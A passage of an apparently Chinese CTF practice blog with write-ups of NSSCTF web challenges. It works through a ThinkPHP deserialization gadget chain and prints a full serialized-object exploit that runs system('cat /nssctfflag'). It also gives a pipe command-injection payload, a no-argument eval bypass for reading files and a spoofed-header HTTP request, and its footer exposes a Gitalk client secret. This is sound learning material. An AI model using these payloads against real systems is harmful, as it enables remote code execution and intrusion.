(<span class="variable">$relation</span>) &#123;</span><br><span class="line">                <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationValue</span>(<span class="variable">$relation</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;json) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">                <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getJsonValue</span>(<span class="variable">$fieldName</span>, <span class="variable">$value</span>);</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>$this-&gt;withAttr</code>存在于且为数组，<code>$fieldName</code>在<code>$this-&gt;json</code>中存在就能执行<code>getJsonValue</code>，跟进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getJsonValue</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$name</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$closure</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;jsonAssoc) &#123;</span><br><span class="line">            <span class="variable">$value</span>[<span class="variable">$key</span>] = <span class="variable">$closure</span>(<span class="variable">$value</span>[<span class="variable">$key</span>], <span class="variable">$value</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span>-&gt;<span class="variable">$key</span> = <span class="variable">$closure</span>(<span class="variable">$value</span>-&gt;<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>变量覆盖RCE，控制<code>$this-&gt;jsonAssoc</code>为true即可利用</p>
<p>到这里整理一下链子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Conversion::__toString()</span><br><span class="line">Conversion::toJson()</span><br><span class="line">Conversion::toArray() //$this-&gt;data</span><br><span class="line">Attribute::getAttr()</span><br><span class="line">Attribute::getValue() //$this-&gt;json $this-&gt;withAttr</span><br><span class="line">Attribute::getJsonValue()</span><br></pre></td></tr></table></figure>

<p>data是可控的，如果控制data为<code>$this-&gt;data=[&#39;whoami&#39;=&gt;[&#39;whoami&#39;]]</code>，经过foreach传入<code>Attribute::getAttr()</code>，key就是whoami</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="comment">// 合并关联数据</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"><span class="comment">//$this-&gt;data=[&#x27;whoami&#x27;=&gt;[&#x27;whoami&#x27;]]</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">...</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) || <span class="literal">true</span> !== <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);<span class="comment">//$key=whoami</span></span><br><span class="line">            &#125;</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$relation</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRelationAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getValue</span>(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getAttr()</code>里用的是<code>getData()</code>来获取数组value的，刚才我们控制了data为键值对，<code>key</code>是<code>whoami</code>，值是<code>[&#39;whoami&#39;]</code>，最终<code>$value=[&#39;whoami&#39;]</code>，刚才说了<code>$this-&gt;withAttr</code>存在且为数组，<code>$fieldName</code>在<code>$this-&gt;json</code>中存在就能执行<code>getJsonValue</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationValue</span>(<span class="variable">$relation</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;json) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getJsonValue</span>(<span class="variable">$fieldName</span>, <span class="variable">$value</span>);</span><br></pre></td></tr></table></figure>

<p>控制<code>$this-&gt;withAttr=[&#39;whoami&#39;=&gt;[&#39;system&#39;]]</code>，<code>$this-&gt;json=[&#39;whoami&#39;]</code>，进入最后的<code>getJsonValue()</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getJsonValue</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$name</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$closure</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;jsonAssoc) &#123;</span><br><span class="line">            <span class="variable">$value</span>[<span class="variable">$key</span>] = <span class="variable">$closure</span>(<span class="variable">$value</span>[<span class="variable">$key</span>], <span class="variable">$value</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span>-&gt;<span class="variable">$key</span> = <span class="variable">$closure</span>(<span class="variable">$value</span>-&gt;<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$name=&#39;whaomi,$value=[&#39;whoami&#39;],$this-&gt;withAttr[$name]=[&#39;system&#39;]</code></p>
<p>poc构造的角度结束，来看exp构造(<code>__destruct()</code>利用过程)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Model::__destruct()</span><br><span class="line">Model::save()</span><br><span class="line">Model::updateData()</span><br><span class="line">Model::checkAllowFields()</span><br><span class="line">Model::db()  //__toString()</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazySave) &#123; <span class="comment">//控制$this-&gt;lazySave=true</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isEmpty</span>() || <span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123; <span class="comment">//$this-&gt;data非空即可</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;exists ? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateData</span>() : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insertData</span>(<span class="variable">$sequence</span>); <span class="comment">//控制$this-&gt;exists为true</span></span><br></pre></td></tr></table></figure>

<p>然后到<code>Model::db()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span>(<span class="params"><span class="variable">$scope</span> = []</span>): <span class="title">Query</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">        <span class="variable">$query</span> = <span class="built_in">self</span>::<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$this</span>-&gt;connection)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">name</span>(<span class="variable">$this</span>-&gt;name . <span class="variable">$this</span>-&gt;suffix)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">pk</span>(<span class="variable">$this</span>-&gt;pk);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;table)) &#123;</span><br><span class="line">            <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">table</span>(<span class="variable">$this</span>-&gt;table . <span class="variable">$this</span>-&gt;suffix);</span><br><span class="line">        &#125;<span class="comment">//控制$this-&gt;talbe为实例化的对象当做字符串调用触发__toString()</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Model是抽象类，利用了我们涉及到的<code>Attribute</code>和<code>Conversion</code>接口，关键字可以直接使用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span>, <span class="title">ArrayAccess</span>, <span class="title">Arrayable</span>, <span class="title">Jsonable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>寻找一个可以被实例化的Model子类开始构造exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span> = <span class="title class_">true</span>;</span><br><span class="line"><span class="comment">//        private $data = [&#x27;whoami&#x27;=&gt;[&#x27;ls /&#x27;]];</span></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&#x27;whoami&#x27;</span>=&gt;[<span class="string">&#x27;cat /nssctfflag&#x27;</span>]];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&#x27;whoami&#x27;</span>=&gt;[<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span> = [<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="keyword">new</span> <span class="title class_">Pivot</span>());</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在题目的Index.php中存在一个test路由，里面反序列化了post参数a，传入即可</p>
<h1 id="138-NSSRound-7-Team-ec-RCE"><a href="#138-NSSRound-7-Team-ec-RCE" class="headerlink" title="138.[NSSRound#7 Team]ec_RCE"></a>138.[NSSRound#7 Team]ec_RCE</h1><p>payload:<code>POST action=|cat /flag&amp;data=1</code></p>
<h1 id="139-GXYCTF-2019-禁止套娃"><a href="#139-GXYCTF-2019-禁止套娃" class="headerlink" title="139.[GXYCTF 2019]禁止套娃"></a>139.[GXYCTF 2019]禁止套娃</h1><p>两种办法，本质都是绕过waf。</p>
<p>1、session注入</p>
<p>扫目录发现git泄露，然后用githacker拿下源码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">githacker --url http://node4.anna.nssctf.cn:28396/ --output-folder out</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>cookie传参设置<code>session_id</code>的值，使用<code>session_start</code>来开启，使用<code>show_source</code>来读取</p>
<p><img src="C:\Users\17816\AppData\Roaming\Typora\typora-user-images\image-20231215163217550.png" alt="image-20231215163217550"></p>
<p>2、读取环境变量并输出</p>
<p><code>?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</code></p>
<h1 id="140-MoeCTF-2021-Do-you-know-HTTP"><a href="#140-MoeCTF-2021-Do-you-know-HTTP" class="headerlink" title="140.[MoeCTF 2021]Do you know HTTP"></a>140.[MoeCTF 2021]Do you know HTTP</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HS / HTTP/1.1</span><br><span class="line">Host: node5.anna.nssctf.cn:28033</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: LT</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Referer: www.ltyyds.com</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>四个点：</p>
<p>1、请求方法</p>
<p>2、UA</p>
<p>3、XFF</p>
<p>4、Referer</p>
<h1 id="141-HNCTF-2022-WEEK3-ssssti"><a href="#141-HNCTF-2022-WEEK3-ssssti" class="headerlink" title="141.[HNCTF 2022 WEEK3]ssssti"></a>141.[HNCTF 2022 WEEK3]ssssti</h1><p>焚靖一把梭</p>

        
    </section>
</article>



<div class="comments">
    <div id="comments"></div>
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
    new Gitalk({
        clientID: "8db4b4a89548994388e9",
        clientSecret: "83900737a29fd1d7795db259d911ae2deba58908",
        repo: "linyuqi9.github.io",
        owner: "linyuqi9",
        admin: ["linyuqi9"],
        id: "e929b238270ba92cb1454c6e97c7212d",
        distractionFreeMode: true,
        title: "NSS刷题记录",
        body: "https://www.ayanagi.fun/2023/12/15/NSS%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/",
        labels: ["CTF"]
    }).render('comments');
    </script>
</div>



            </div>
        </div>

        
            
            <a id="pagenext" href="/2023/04/01/KrnWtdJ3y/" class="article-next" title="简单写个端口扫描器"><i class="icon-arrow-right"></i></a>
            
            
        

        <footer class="footer">
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, Theme by <a href="https://github.com/sanonz/hexo-theme-concise" target="_blank">Concise</a>

    
    <script>
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?3f0e368eb1f22fb5a593be6193301ba9";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>
    
</footer>

    </main>

    <script type="text/javascript" src="https://unpkg.com/jquery@1.9.1/jquery.min.js"></script>
    <script type="text/javascript">
    $(function() {
        var nodes = {
            nav: $('#nav'),
            aside: $('#aside'),
            asideInner: $('#aside-inner'),
            navInner: $('#nav-inner')
        };

        var doing = false;
        nodes.asideInner.on('webkitAnimationEnd mozAnimationEnd oAnimationEnd oanimationend animationend', function() {
            if (nodes.aside.hasClass('mobile-open')) {
                nodes.aside.removeClass('mobile-open');
            } else {
                nodes.aside.removeClass('mobile-close panel-show');
            }
            doing = false;
        });
        $('#open-panel, #aside-mask').on('click', function() {
            if (doing) {
                return;
            }

            if (nodes.aside.hasClass('panel-show')) {
                nodes.aside.addClass('mobile-close');
            } else {
                nodes.aside.addClass('mobile-open panel-show');
            }
        });
        $('#open-menus').on('click', function() {
            nodes.navInner.slideToggle('normal', slideDone);
        });

        if (window.innerWidth <= 960) {
            setTimeout(function() {
                nodes.navInner.slideUp('normal', slideDone);
            }, 3000);
        }

        function slideDone() {
            if (nodes.navInner.css('display') !== 'none') {
                nodes.navInner.css('display', '');
            }
        }

        $(window).on('resize', function() {
            if ($(this).width() > 960) {
                nodes.navInner.css('display', '');
            }
        });
    });
    </script>
    
        
<script src="/js/scrollspy.min.js"></script>

        <script type="text/javascript">
        $(document.body).scrollspy({target: '#aside-inner'});

        $(window).on('resize', function() {
            var hw = $('#header').width();
            var ww = $('#wrapper').width();
            var space = ($(this).width() - hw - ww) / 2 / 2;

            var pageprev = $('#pageprev');
            var pagenext = $('#pagenext');
            var avg = (pageprev.width() + pagenext.width()) / 2

            if(space > avg) {
                var len = space - avg / 2;
                var styles = {position: 'fixed', top: '50%', marginTop: - (pageprev.width() + pagenext.width()) / 4}
                pageprev.css($.extend({left: hw + len}, styles));
                pagenext.css($.extend({right: len}, styles));
            } else {
                pageprev.removeAttr('style');
                pagenext.removeAttr('style');
            }
        }).trigger('resize');
        </script>
    

</body>
</html>
